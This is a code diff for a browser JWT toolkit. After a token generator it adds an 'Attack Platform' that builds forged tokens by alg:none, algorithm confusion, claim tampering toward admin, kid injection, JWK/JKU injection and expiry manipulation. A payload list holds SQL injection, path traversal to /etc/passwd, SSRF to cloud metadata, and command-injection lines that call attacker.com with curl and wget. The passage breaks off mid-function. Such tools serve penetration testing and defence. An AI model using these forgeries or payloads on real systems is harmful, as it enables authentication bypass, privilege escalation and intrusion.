+  'ES384': 'ECDSA P-384 + SHA-384 — elliptic curve signing',
+  'ES512': 'ECDSA P-521 + SHA-512 — elliptic curve signing',
+};
+
+const JG_CLAIM_DEFAULTS = {
+  sub: '"1234567890"',
+  iss: '"https://auth.example.com"',
+  aud: '"api.example.com"',
+  exp: String(Math.floor(Date.now()/1000) + 3600),
+  nbf: String(Math.floor(Date.now()/1000)),
+  iat: String(Math.floor(Date.now()/1000)),
+  jti: '"' + crypto.randomUUID() + '"',
+  name: '"John Doe"',
+  email: '"john@example.com"',
+  role: '"user"',
+  scope: '"read write"',
+};
+
+const JG_PRESETS = {
+  minimal: { sub:"1234567890", iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+3600 },
+  user: { sub:"user-001", name:"John Doe", email:"john@example.com", role:"user", iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+3600, iss:"https://auth.example.com", aud:"api.example.com" },
+  admin: { sub:"admin-001", name:"Admin User", email:"admin@example.com", role:"admin", permissions:["read","write","delete","admin"], iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+3600, iss:"https://auth.example.com", aud:"api.example.com", jti: crypto.randomUUID() },
+  service: { sub:"service:payments", name:"Payments Service", scope:"payments:read payments:write", client_id:"svc-payments-001", iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+86400, iss:"https://auth.example.com", aud:"https://api.example.com", jti: crypto.randomUUID() },
+  oidc: { iss:"https://accounts.example.com", sub:"user-abc-123", aud:"client-app-id", exp: Math.floor(Date.now()/1000)+3600, iat: Math.floor(Date.now()/1000), nonce: crypto.randomUUID().replace(/-/g,'').slice(0,16), email:"user@example.com", email_verified:true, name:"Jane Smith", given_name:"Jane", family_name:"Smith" },
+  api: { iss:"https://auth.example.com", sub:"client-app-xyz", aud:"https://api.example.com", exp: Math.floor(Date.now()/1000)+900, iat: Math.floor(Date.now()/1000), nbf: Math.floor(Date.now()/1000), jti: crypto.randomUUID(), scope:"read:users write:posts", client_id:"app-xyz-001" },
+};
+
+let jgCurrentAlg = 'HS256';
+let jgGeneratedToken = '';
+let jgGeneratedKeyPair = null;
+
+function jgSetAlg(alg, btn) {
+  jgCurrentAlg = alg;
+  document.querySelectorAll('.jg-alg-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('jgAlgDesc').textContent = JG_ALG_DESCS[alg] || '';
+
+  const isHmac = ['HS256','HS384','HS512'].includes(alg);
+  const isAsym = ['RS256','RS384','RS512','ES256','ES384','ES512'].includes(alg);
+  const isNone = alg === 'none';
+
+  document.getElementById('jgHmacCard').style.display = isNone ? 'none' : (isHmac ? '' : 'none');
+  document.getElementById('jgNoneHint').style.display  = isNone ? 'block' : 'none';
+  document.getElementById('jgAsymCard').style.display  = isAsym ? '' : 'none';
+
+  if (isAsym) {
+    const isEC = alg.startsWith('ES');
+    document.getElementById('jgKeyCardTitle').textContent = isEC ? 'EC Private Key' : 'RSA Private Key';
+    document.getElementById('jgGenKeyBtn').textContent = isEC ? '⚡ Generate EC Pair' : '⚡ Generate RSA Pair';
+    document.getElementById('jgVerifyKeyLabel').textContent = isEC ? 'Public Key (EC PEM)' : 'Public Key (RSA PEM)';
+  } else {
+    document.getElementById('jgVerifyKeyLabel').textContent = 'Secret Key (for HMAC)';
+  }
+
+  // update header JSON alg
+  try {
+    const h = JSON.parse(document.getElementById('jgHeaderJson').value);
+    h.alg = alg;
+    document.getElementById('jgHeaderJson').value = JSON.stringify(h, null, 2);
+  } catch(e) {}
+}
+
+function jgToggleSecretVis() {
+  const inp = document.getElementById('jgSecret');
+  inp.type = inp.type === 'password' ? 'text' : 'password';
+}
+
+function jgGenSecret() {
+  const arr = new Uint8Array(32);
+  crypto.getRandomValues(arr);
+  const secret = Array.from(arr).map(b => b.toString(16).padStart(2,'0')).join('');
+  document.getElementById('jgSecret').value = secret;
+  jgCheckStrength();
+  showToast('256-bit random secret generated!');
+}
+
+function jgCheckStrength() {
+  const val = document.getElementById('jgSecret').value;
+  const bar = document.getElementById('jgStrengthBar');
+  const lbl = document.getElementById('jgStrengthLbl');
+  if (!val) { bar.style.width='0'; lbl.textContent='—'; lbl.style.color='var(--text3)'; return; }
+  const bits = val.length * 6.5;
+  let pct, color, label;
+  if      (bits < 64)  { pct=12; color='#ff3b5c'; label='Weak'; }
+  else if (bits < 128) { pct=35; color='#ff9100'; label='Fair'; }
+  else if (bits < 256) { pct=65; color='#ffe033'; label='Good'; }
+  else                 { pct=100; color='#00ff88'; label='Strong'; }
+  bar.style.width = pct+'%'; bar.style.background = color;
+  lbl.textContent = label; lbl.style.color = color;
+}
+
+async function jgGenKeyPair() {
+  const isEC = jgCurrentAlg.startsWith('ES');
+  const btn = document.getElementById('jgGenKeyBtn');
+  btn.textContent = '⏳ Generating...';
+  btn.disabled = true;
+  try {
+    if (isEC) {
+      const curveMap = { ES256:'P-256', ES384:'P-384', ES512:'P-521' };
+      const curve = curveMap[jgCurrentAlg] || 'P-256';
+      const kp = await crypto.subtle.generateKey({ name:'ECDSA', namedCurve: curve }, true, ['sign','verify']);
+      jgGeneratedKeyPair = kp;
+      const privDer = await crypto.subtle.exportKey('pkcs8', kp.privateKey);
+      const pubDer  = await crypto.subtle.exportKey('spki',  kp.publicKey);
+      const privPem = derToPem(privDer, 'PRIVATE KEY');
+      const pubPem  = derToPem(pubDer,  'PUBLIC KEY');
+      document.getElementById('jgPrivKey').value = privPem;
+      document.getElementById('jgPubKey').value  = pubPem;
+      document.getElementById('jgKeyInfo').style.display = 'block';
+      document.getElementById('jgKeyInfo').textContent = `✓ ${jgCurrentAlg} (${curve}) key pair generated — ${Math.ceil(privDer.byteLength*8/1000)}k-bit equivalent`;
+      showToast(`${jgCurrentAlg} key pair generated!`);
+    } else {
+      const hashBits = { RS256:256, RS384:384, RS512:512 }[jgCurrentAlg] || 256;
+      const kp = await crypto.subtle.generateKey({ name:'RSASSA-PKCS1-v1_5', modulusLength:2048, publicExponent: new Uint8Array([1,0,1]), hash:'SHA-'+hashBits }, true, ['sign','verify']);
+      jgGeneratedKeyPair = kp;
+      const privDer = await crypto.subtle.exportKey('pkcs8', kp.privateKey);
+      const pubDer  = await crypto.subtle.exportKey('spki',  kp.publicKey);
+      const privPem = derToPem(privDer, 'PRIVATE KEY');
+      const pubPem  = derToPem(pubDer,  'PUBLIC KEY');
+      document.getElementById('jgPrivKey').value = privPem;
+      document.getElementById('jgPubKey').value  = pubPem;
+      document.getElementById('jgKeyInfo').style.display = 'block';
+      document.getElementById('jgKeyInfo').textContent = `✓ RSA-2048 ${jgCurrentAlg} key pair generated`;
+      showToast('RSA-2048 key pair generated!');
+    }
+  } catch(e) {
+    showToast('Key generation failed: ' + e.message);
+    console.error(e);
+  }
+  btn.textContent = isEC ? '⚡ Generate EC Pair' : '⚡ Generate RSA Pair';
+  btn.disabled = false;
+}
+
+function derToPem(der, type) {
+  const b64 = btoa(String.fromCharCode(...new Uint8Array(der)));
+  const lines = b64.match(/.{1,64}/g).join('\n');
+  return `-----BEGIN ${type}-----\n${lines}\n-----END ${type}-----`;
+}
+
+async function pemToPrivateKey(pem, alg) {
+  const b64 = pem.replace(/-----[^-]+-----/g,'').replace(/\s+/g,'');
+  const der  = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+  const hashBits = { RS256:256, RS384:384, RS512:512, ES256:256, ES384:384, ES512:512 }[alg] || 256;
+  const isEC = alg.startsWith('ES');
+  const curveMap = { ES256:'P-256', ES384:'P-384', ES512:'P-521' };
+  const algParam = isEC
+    ? { name:'ECDSA', namedCurve: curveMap[alg] }
+    : { name:'RSASSA-PKCS1-v1_5', hash:'SHA-'+hashBits };
+  return crypto.subtle.importKey('pkcs8', der.buffer, algParam, false, ['sign']);
+}
+
+async function pemToPublicKey(pem, alg) {
+  const b64 = pem.replace(/-----[^-]+-----/g,'').replace(/\s+/g,'');
+  const der  = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+  const hashBits = { RS256:256, RS384:384, RS512:512, ES256:256, ES384:384, ES512:512 }[alg] || 256;
+  const isEC = alg.startsWith('ES');
+  const curveMap = { ES256:'P-256', ES384:'P-384', ES512:'P-521' };
+  const algParam = isEC
+    ? { name:'ECDSA', namedCurve: curveMap[alg] }
+    : { name:'RSASSA-PKCS1-v1_5', hash:'SHA-'+hashBits };
+  return crypto.subtle.importKey('spki', der.buffer, algParam, false, ['verify']);
+}
+
+async function signAsym(privKeyObj, signingInput, alg) {
+  const enc = new TextEncoder();
+  const hashBits = { RS256:256, RS384:384, RS512:512, ES256:256, ES384:384, ES512:512 }[alg] || 256;
+  const isEC = alg.startsWith('ES');
+  const algParam = isEC ? { name:'ECDSA', hash:'SHA-'+hashBits } : { name:'RSASSA-PKCS1-v1_5' };
+  const rawSig = await crypto.subtle.sign(algParam, privKeyObj, enc.encode(signingInput));
+  return btoa(String.fromCharCode(...new Uint8Array(rawSig))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+}
+
+function jgAddClaim(key) {
+  const ta = document.getElementById('jgPayloadJson');
+  let obj = {};
+  try { obj = JSON.parse(ta.value); } catch(e) {}
+  if (obj[key] !== undefined) { showToast(key + ' already present'); return; }
+  const raw = JG_CLAIM_DEFAULTS[key];
+  obj[key] = raw !== undefined ? JSON.parse(raw) : '';
+  ta.value = JSON.stringify(obj, null, 2);
+  jgLiveUpdate();
+}
+
+function jgLoadPreset(name) {
+  const p = JG_PRESETS[name];
+  if (!p) return;
+  document.getElementById('jgPayloadJson').value = JSON.stringify(p, null, 2);
+  jgLiveUpdate();
+  showToast('Preset loaded: ' + name);
+}
+
+function jgResetHeader() {
+  document.getElementById('jgHeaderJson').value = JSON.stringify({alg: jgCurrentAlg, typ:'JWT'}, null, 2);
+  jgLiveUpdate();
+}
+
+function jgClearPayload() {
+  document.getElementById('jgPayloadJson').value = '{}';
+  jgLiveUpdate();
+}
+
+function jgFormatJson(id) {
+  try {
+    const el = document.getElementById(id);
+    el.value = JSON.stringify(JSON.parse(el.value), null, 2);
+  } catch(e) { showToast('Invalid JSON'); }
+}
+
+function jgLiveUpdate() {
+  // Validate JSON on-the-fly
+  const errEl = document.getElementById('jgPayloadErr');
+  try {
+    JSON.parse(document.getElementById('jgPayloadJson').value);
+    errEl.style.display = 'none';
+  } catch(e) {
+    errEl.style.display = 'block';
+    errEl.textContent = '⚠ JSON Error: ' + e.message;
+  }
+}
+
+async function jgGenerate() {
+  const alg = jgCurrentAlg;
+  const headerStr  = document.getElementById('jgHeaderJson').value.trim();
+  const payloadStr = document.getElementById('jgPayloadJson').value.trim();
+
+  let header, payload;
+  try { header  = JSON.parse(headerStr); } catch(e) { showToast('Invalid header JSON: ' + e.message); return; }
+  try { payload = JSON.parse(payloadStr); } catch(e) { showToast('Invalid payload JSON: ' + e.message); return; }
+
+  // Force alg in header
+  header.alg = alg;
+  if (!header.typ) header.typ = 'JWT';
+
+  const hEnc = b64UrlEncode(JSON.stringify(header));
+  const pEnc = b64UrlEncode(JSON.stringify(payload));
+  const sigInput = hEnc + '.' + pEnc;
+
+  let sig = '';
+  const isHmac = ['HS256','HS384','HS512'].includes(alg);
+  const isRsa   = ['RS256','RS384','RS512'].includes(alg);
+  const isEc    = ['ES256','ES384','ES512'].includes(alg);
+
+  try {
+    if (isHmac) {
+      const secret = document.getElementById('jgSecret').value;
+      if (!secret) { showToast('Enter a secret key first'); return; }
+      sig = await hmacSign(secret, sigInput, alg) || '';
+    } else if (isRsa || isEc) {
+      const privPem = document.getElementById('jgPrivKey').value.trim();
+      if (!privPem) { showToast('Paste or generate a private key first'); return; }
+      const privKey = await pemToPrivateKey(privPem, alg);
+      sig = await signAsym(privKey, sigInput, alg);
+    }
+    // none: sig stays ''
+  } catch(e) {
+    showToast('Signing error: ' + e.message);
+    console.error(e);
+    return;
+  }
+
+  const token = sigInput + '.' + sig;
+  jgGeneratedToken = token;
+
+  // Update header JSON display to reflect final header
+  document.getElementById('jgHeaderJson').value = JSON.stringify(header, null, 2);
+
+  // Render output
+  document.getElementById('jgOutputCard').style.display = '';
+  document.getElementById('jgTokenVisual').innerHTML =
+    '<span class="jwt-part-header">' + hEnc + '</span>' +
+    '<span class="jwt-dot">.</span>' +
+    '<span class="jwt-part-payload">' + pEnc + '</span>' +
+    '<span class="jwt-dot">.</span>' +
+    '<span class="jwt-part-sig">' + (sig || '<em style="color:var(--text3)">unsigned</em>') + '</span>';
+  document.getElementById('jgTokenVisual').dataset.token = token;
+  document.getElementById('jgRawOut').value = token;
+
+  // Stats
+  const exp = payload.exp;
+  document.getElementById('jgSAlg').textContent    = alg;
+  document.getElementById('jgSSize').textContent   = token.length + ' B';
+  document.getElementById('jgSClaims').textContent = Object.keys(payload).length;
+  document.getElementById('jgSExp').textContent    = exp ? new Date(exp*1000).toLocaleString() : 'None';
+  document.getElementById('jgSSigned').textContent = sig ? '✓ Yes' : '✗ No';
+
+  // Decoded preview
+  document.getElementById('jgDecodedHeader').innerHTML  = syntaxHighlight(header);
+  document.getElementById('jgDecodedPayload').innerHTML = syntaxHighlight(payload);
+
+  // Show public key card for asymmetric
+  const pubKeyCard = document.getElementById('jgPublicKeyCard');
+  const pubKeyPem  = document.getElementById('jgPubKey').value.trim();
+  if ((isRsa || isEc) && pubKeyPem) {
+    document.getElementById('jgPubKeyOut').value = pubKeyPem;
+    pubKeyCard.style.display = '';
+  } else {
+    pubKeyCard.style.display = 'none';
+  }
+
+  showToast('JWT generated successfully!');
+}
+
+function jgCopyToken() {
+  if (!jgGeneratedToken) { showToast('Generate a token first'); return; }
+  navigator.clipboard.writeText(jgGeneratedToken).then(() => showToast('Token copied!'));
+}
+
+function jgSendToDecoder() {
+  if (!jgGeneratedToken) { showToast('Generate a token first'); return; }
+  document.getElementById('jwtInput').value = jgGeneratedToken;
+  switchTab('decoder'); analyzeJWT();
+}
+
+function jgSendToEditor() {
+  if (!jgGeneratedToken) { showToast('Generate a token first'); return; }
+  document.getElementById('editorSourceInput').value = jgGeneratedToken;
+  switchTab('editor'); loadToEditor();
+}
+
+function jgSendToAttack() {
+  if (!jgGeneratedToken) { showToast('Generate a token first'); return; }
+  document.getElementById('atkSourceToken').value = jgGeneratedToken;
+  switchTab('attack'); atkTokenChanged();
+}
+
+async function jgVerify() {
+  if (!jgGeneratedToken) { showToast('Generate a token first'); return; }
+  const alg    = jgCurrentAlg;
+  const secret = document.getElementById('jgVerifySecret').value.trim();
+  const resEl  = document.getElementById('jgVerifyResult');
+  const parts  = jgGeneratedToken.split('.');
+  const sigInput = parts[0] + '.' + parts[1];
+  const origSig  = parts[2] || '';
+
+  const isHmac = ['HS256','HS384','HS512'].includes(alg);
+  const isAsym = ['RS256','RS384','RS512','ES256','ES384','ES512'].includes(alg);
+
+  resEl.style.display = 'block';
+  try {
+    if (isHmac) {
+      const computedSig = await hmacSign(secret, sigInput, alg);
+      const ok = computedSig === origSig;
+      resEl.className = 'jg-verify-result ' + (ok ? 'jg-verify-ok' : 'jg-verify-fail');
+      resEl.textContent = ok ? '✓ Signature VALID — secret is correct!' : '✗ Signature INVALID — wrong secret or tampered token';
+    } else if (isAsym) {
+      const pubKey = await pemToPublicKey(secret, alg);
+      const enc = new TextEncoder();
+      const hashBits = {RS256:256,RS384:384,RS512:512,ES256:256,ES384:384,ES512:512}[alg]||256;
+      const isEC = alg.startsWith('ES');
+      const algParam = isEC ? {name:'ECDSA',hash:'SHA-'+hashBits} : {name:'RSASSA-PKCS1-v1_5'};
+      const rawSig = Uint8Array.from(atob(origSig.replace(/-/g,'+').replace(/_/g,'/')), c=>c.charCodeAt(0));
+      const ok = await crypto.subtle.verify(algParam, pubKey, rawSig, enc.encode(sigInput));
+      resEl.className = 'jg-verify-result ' + (ok ? 'jg-verify-ok' : 'jg-verify-fail');
+      resEl.textContent = ok ? '✓ Signature VALID — public key matches!' : '✗ Signature INVALID — wrong key or tampered token';
+    } else {
+      resEl.className = 'jg-verify-result jg-verify-fail';
+      resEl.textContent = 'alg:none tokens have no signature to verify';
+    }
+  } catch(e) {
+    resEl.className = 'jg-verify-result jg-verify-fail';
+    resEl.textContent = '✗ Verification error: ' + e.message;
+  }
+}
+
+/* ═══════════════════════════════════════════════════════
+   Attack Platform
+═══════════════════════════════════════════════════════ */
+
+// ── Helper: parse source token ──
+function atkGetParsed() {
+  const raw = document.getElementById('atkSourceToken').value.trim();
+  if (!raw) { showToast('Paste a JWT token in the sidebar first'); return null; }
+  const parts = raw.split('.');
+  if (parts.length < 2) { showToast('Invalid JWT format'); return null; }
+  const headerRaw = b64UrlDecode(parts[0]);
+  const payloadRaw = b64UrlDecode(parts[1]);
+  if (!headerRaw || !payloadRaw) { showToast('Could not decode JWT parts'); return null; }
+  const header = jsonParse(headerRaw);
+  const payload = jsonParse(payloadRaw);
+  if (!header || !payload) { showToast('Could not parse JWT JSON'); return null; }
+  return { raw, parts, header, payload, sig: parts[2] || '' };
+}
+
+function atkShowModule(id) {
+  document.querySelectorAll('.atk-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.atk-nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('atk-' + id).classList.add('active');
+  event.currentTarget.classList.add('active');
+}
+
+function atkTokenChanged() {
+  const raw = (document.getElementById('atkSourceToken').value || '').trim();
+  const info = document.getElementById('atkTokenInfo');
+  if (!raw) { info.textContent = 'No token loaded'; return; }
+  const parts = raw.split('.');
+  if (parts.length !== 3) { info.textContent = '⚠ Invalid JWT (need 3 parts)'; info.style.color='var(--red)'; return; }
+  try {
+    const h = jsonParse(b64UrlDecode(parts[0]));
+    const p = jsonParse(b64UrlDecode(parts[1]));
+    const alg = h ? h.alg : '?';
+    const sub = p ? (p.sub || '—') : '—';
+    const exp = p && p.exp ? new Date(p.exp*1000).toLocaleString() : 'No exp';
+    info.style.color = 'var(--green)';
+    info.textContent = 'alg:' + alg + ' | sub:' + sub + ' | exp:' + exp;
+    // pre-populate tamper payload
+    if (p) {
+      const tp = document.getElementById('tamperPayload');
+      if (tp && !tp.value) tp.value = JSON.stringify(p, null, 2);
+      const sp = document.getElementById('sigStripPayload');
+      if (sp && !sp.value) sp.value = JSON.stringify(p, null, 2);
+      const ap = document.getElementById('algNonePayload');
+      if (ap && !ap.value) ap.value = '';
+    }
+  } catch(e) {
+    info.textContent = '⚠ Could not parse token';
+    info.style.color = 'var(--red)';
+  }
+}
+
+function atkPasteFromDecoder() {
+  const v = document.getElementById('jwtInput').value.trim();
+  if (!v) { showToast('Decoder tab has no token'); return; }
+  document.getElementById('atkSourceToken').value = v;
+  atkTokenChanged();
+  showToast('Token loaded from Decoder');
+}
+
+function selectAtkVariant(groupId, btn, val) {
+  document.querySelectorAll('#' + groupId + ' .atk-variant-btn').forEach(b => b.classList.remove('sel'));
+  btn.classList.add('sel');
+  btn.dataset.val = val;
+  // side effects
+  if (groupId === 'kidAttackType') atkUpdateKidVariants(val);
+  if (groupId === 'jwkAttackType') atkToggleJwkFields(val);
+}
+
+function getAtkVariantVal(groupId) {
+  const sel = document.querySelector('#' + groupId + ' .atk-variant-btn.sel');
+  return sel ? (sel.dataset.val || sel.textContent.trim()) : '';
+}
+
+function atkRenderToken(outId, token) {
+  const parts = token.split('.');
+  const el = document.getElementById(outId);
+  el.innerHTML =
+    '<span class="jwt-part-header">' + (parts[0]||'') + '</span>' +
+    '<span class="jwt-dot">.</span>' +
+    '<span class="jwt-part-payload">' + (parts[1]||'') + '</span>' +
+    '<span class="jwt-dot">.</span>' +
+    '<span class="jwt-part-sig">' + (parts[2] !== undefined ? parts[2] : '') + '</span>';
+  el.dataset.token = token;
+}
+
+function atkCopy(outId) {
+  const el = document.getElementById(outId);
+  const token = el.dataset.token;
+  if (!token) { showToast('Generate a token first'); return; }
+  navigator.clipboard.writeText(token).then(() => showToast('Attack token copied!'));
+}
+
+function atkSendDecoder(outId) {
+  const el = document.getElementById(outId);
+  const token = el.dataset.token;
+  if (!token) { showToast('Generate a token first'); return; }
+  document.getElementById('jwtInput').value = token;
+  switchTab('decoder');
+  analyzeJWT();
+}
+
+// ── MODULE 1: alg:none ──
+function runAlgNone() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const variant = getAtkVariantVal('algNoneVariants') || 'none';
+  const customPayload = document.getElementById('algNonePayload').value.trim();
+  const newHeader = { ...parsed.header, alg: variant };
+  const newPayload = customPayload ? (jsonParse(customPayload) || parsed.payload) : parsed.payload;
+  const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+  const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+  const token = hEnc + '.' + pEnc + '.';
+  atkRenderToken('algNoneOut', token);
+  document.getElementById('algNoneResult').classList.add('show');
+  showToast('alg:none token generated');
+}
+
+// ── MODULE 2: Algorithm Confusion ──
+async function runAlgConf() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const targetAlg = getAtkVariantVal('algConfTarget') || 'HS256';
+  const pubKeyRaw = document.getElementById('algConfPubKey').value.trim();
+  const customPayload = document.getElementById('algConfPayload').value.trim();
+  if (!pubKeyRaw) { showToast('Paste the server public key first'); return; }
+
+  // Use public key as HMAC secret (PEM or raw)
+  const secret = pubKeyRaw;
+  const newHeader = { ...parsed.header, alg: targetAlg };
+  delete newHeader.kid; // remove kid to avoid key confusion
+  const newPayload = customPayload ? (jsonParse(customPayload) || parsed.payload) : parsed.payload;
+  const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+  const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+  const sig = await hmacSign(secret, hEnc + '.' + pEnc, targetAlg) || '';
+  const token = hEnc + '.' + pEnc + '.' + sig;
+  atkRenderToken('algConfOut', token);
+  document.getElementById('algConfResult').classList.add('show');
+  showToast('Algorithm confusion token generated');
+}
+
+// ── MODULE 3: Claim Tampering ──
+function atkTamperPreset(preset) {
+  const parsed = atkGetParsed();
+  let p = parsed ? { ...parsed.payload } : {};
+  const now = Math.floor(Date.now()/1000);
+  if (preset === 'admin')     { p.role = 'admin'; p.is_admin = true; }
+  if (preset === 'removeexp') { delete p.exp; }
+  if (preset === 'extendexp') { p.exp = now + 365*24*3600; }
+  if (preset === 'subzero')   { p.sub = '0'; }
+  if (preset === 'subadmin')  { p.sub = 'admin'; p.name = 'Admin'; }
+  if (preset === 'allperms')  { p.role = 'admin'; p.scope = 'read write delete admin'; p.permissions = ['*']; p.exp = now + 365*24*3600; }
+  document.getElementById('tamperPayload').value = JSON.stringify(p, null, 2);
+}
+
+async function runClaimTamper() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const payloadStr = document.getElementById('tamperPayload').value.trim();
+  const newPayload = jsonParse(payloadStr) || parsed.payload;
+  const secret = document.getElementById('tamperSecret').value.trim();
+  const alg = document.getElementById('tamperAlg').value;
+
+  const newHeader = { ...parsed.header };
+  if (alg !== 'none') newHeader.alg = alg;
+  else newHeader.alg = 'none';
+
+  const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+  const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+  let sig = '';
+  if (secret && alg !== 'none') sig = await hmacSign(secret, hEnc + '.' + pEnc, alg) || '';
+  else if (!secret) sig = parsed.sig; // keep original sig
+
+  const token = hEnc + '.' + pEnc + '.' + sig;
+  atkRenderToken('tamperOut', token);
+
+  // Diff
+  const orig = parsed.payload;
+  const diffs = [];
+  const allKeys = new Set([...Object.keys(orig), ...Object.keys(newPayload)]);
+  allKeys.forEach(k => {
+    const ov = JSON.stringify(orig[k]);
+    const nv = JSON.stringify(newPayload[k]);
+    if (ov !== nv) diffs.push({ k, ov: ov||'(missing)', nv: nv||'(removed)' });
+  });
+  const diffEl = document.getElementById('tamperDiff');
+  if (diffs.length) {
+    diffEl.innerHTML = '<strong>Changes Made:</strong><table class="atk-diff-table" style="margin-top:8px"><thead><tr><th>Claim</th><th>Before</th><th>After</th></tr></thead><tbody>' +
+      diffs.map(d => `<tr><td class="diff-key">${d.k}</td><td class="diff-before">${d.ov}</td><td class="diff-after">${d.nv}</td></tr>`).join('') +
+      '</tbody></table>';
+  } else {
+    diffEl.innerHTML = '<strong>No claim changes detected.</strong>';
+  }
+
+  document.getElementById('tamperResult').classList.add('show');
+  showToast('Tampered token generated');
+}
+
+// ── MODULE 4: kid Injection ──
+const KID_PAYLOADS = {
+  sql: ["1' OR '1'='1", "1' OR 1=1--", "' OR ''='", "1; DROP TABLE keys--", "1' UNION SELECT 'secret'--", "admin'--"],
+  path: ['../../dev/null', '../../../dev/null', '../../../../../../dev/null', '../../../etc/passwd', '....//....//dev/null', '%2e%2e%2f%2e%2e%2fdev%2fnull'],
+  cmd: ['key; id', 'key | id', 'key`id`', 'key$(id)', 'key; curl http://attacker.com', 'key; wget http://attacker.com'],
+  ssrf: ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:8080/key', 'http://internal-service/key', 'file:///etc/passwd', 'gopher://127.0.0.1:6379/', 'dict://127.0.0.1:6379/'],
+  custom: ['']
+};
+function atkUpdateKidVariants(type) {
+  const variants = KID_PAYLOADS[type] || [''];
+  const container = document.getElementById('kidPayloadVariants');
+  container.innerHTML = variants.map((v,i) =>
+    `<button class="atk-variant-btn${i===0?' sel':''}" onclick="document.getElementById('kidValue').value=this.dataset.p;this.parentElement.querySelectorAll('.atk-variant-btn').forEach(b=>b.classList.remove('sel'));this.classList.add('sel')" data-p="${v.replace(/"/g,'&quot;')}">${v||'(custom)'}</button>`
+  ).join('');
+  if (variants[0]) document.getElementById('kidValue').value = variants[0];
+  else document.getElementById('kidValue').value = '';
+}
+// init kid variants
+setTimeout(() => atkUpdateKidVariants('sql'), 200);
+
+async function runKidAttack() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const kidVal = document.getElementById('kidValue').value;
+  const secret = document.getElementById('kidSecret').value.trim();
+  const newHeader = { ...parsed.header, kid: kidVal };
+  const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+  const pEnc = b64UrlEncode(JSON.stringify(parsed.payload));
+  let sig = '';
+  if (secret) {
+    const alg = newHeader.alg || 'HS256';
+    sig = await hmacSign(secret, hEnc + '.' + pEnc, alg) || '';
+  }
+  const token = hEnc + '.' + pEnc + '.' + sig;
+  atkRenderToken('kidOut', token);
+  document.getElementById('kidResult').classList.add('show');
+  showToast('kid injection token generated');
+}
+
+// ── MODULE 5: JWK / JKU Injection ──
+let atkJWKKeyPair = null;
+function atkToggleJwkFields(type) {
+  document.getElementById('jwkEmbeddedFields').style.display = (type === 'embedded_jwk') ? 'block' : 'none';
+  document.getElementById('jwkUrlFields').style.display = (type !== 'embedded_jwk') ? 'block' : 'none';
+}
+
+async function generateJWKPair() {
+  try {
+    const kp = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign','verify']);
+    atkJWKKeyPair = kp;
+    const pubJwk = await crypto.subtle.exportKey('jwk', kp.publicKey);
+    const privJwk = await crypto.subtle.exportKey('jwk', kp.privateKey);
+    pubJwk.use = 'sig'; pubJwk.kid = 'attacker-key-1';
+    document.getElementById('jwkPublicKey').value = JSON.stringify(pubJwk, null, 2);
+    document.getElementById('jwkPrivateKey').value = 'ECDSA P-256 private key loaded (in-memory only)';
+    showToast('ECDSA P-256 key pair generated!');
+  } catch(e) { showToast('Key generation failed: ' + e.message); }
+}
+
+async function runJWKAttack() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const type = getAtkVariantVal('jwkAttackType') || 'embedded_jwk';
+
+  if (type === 'embedded_jwk') {
+    if (!atkJWKKeyPair) { showToast('Generate a key pair first'); return; }
+    const customPayload = document.getElementById('jwkPayload').value.trim();
+    const newPayload = customPayload ? (jsonParse(customPayload) || parsed.payload) : parsed.payload;
+    const pubJwk = JSON.parse(document.getElementById('jwkPublicKey').value);
+    const newHeader = { alg: 'ES256', typ: 'JWT', jwk: pubJwk };
+    const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+    const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+    const signingInput = hEnc + '.' + pEnc;
+    const enc = new TextEncoder();
+    const rawSig = await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, atkJWKKeyPair.privateKey, enc.encode(signingInput));
+    // Convert DER to raw r+s for JWT
+    const arr = new Uint8Array(rawSig);
+    const sig = btoa(String.fromCharCode(...arr)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+    const token = signingInput + '.' + sig;
+    atkRenderToken('jwkOut', token);
+  } else {
+    const urlField = type === 'jku' ? 'jku' : 'x5u';
+    const url = document.getElementById('jwkUrl').value.trim();
+    if (!url) { showToast('Enter your attacker JWKS URL'); return; }
+    const customPayload = document.getElementById('jwkUrlPayload').value.trim();
+    const newPayload = customPayload ? (jsonParse(customPayload) || parsed.payload) : parsed.payload;
+    const newHeader = { alg: 'RS256', typ: 'JWT', [urlField]: url };
+    const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+    const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+    // unsigned — the server should fetch the key from the URL
+    const token = hEnc + '.' + pEnc + '.INJECT';
+    atkRenderToken('jwkOut', token);
+  }
+  document.getElementById('jwkResult').classList.add('show');
+  showToast('JWK attack token generated');
+}
+
+// ── MODULE 6: Expiry Manipulation ──
+function atkExpStrategy(type) {
+  const f = document.getElementById('expExtendFields');
+  f.style.display = (type === 'extend' || type === 'past') ? 'block' : 'none';
+}
+
+async function runExpManip() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const type = getAtkVariantVal('expAttackType') || 'extend';
+  const now = Math.floor(Date.now()/1000);
+  const secret = document.getElementById('expSecret').value.trim();
+  const alg = document.getElementById('expAlg').value;
